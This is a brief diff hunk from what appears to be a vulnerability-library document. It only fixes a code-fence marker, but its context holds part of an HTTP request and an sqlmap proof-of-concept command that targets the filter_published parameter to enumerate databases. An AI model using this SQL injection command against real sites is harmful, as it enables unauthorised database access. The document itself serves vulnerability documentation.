@@ -21,7 +21,7 @@ source: "白阁文库 BaizeSec/bylibrary"
 13 Upgrade-Insecure-Requests: 1
 14
 15 filter_search=&limit=10&filter_published=1&task=&controller=comments&boxchecked=0&filter_order= 
-​```POC```
+```POC```
  sqlmap -r pago --dbs --risk=3 --level=5 --random-agent -p filter_published 
 ```
 
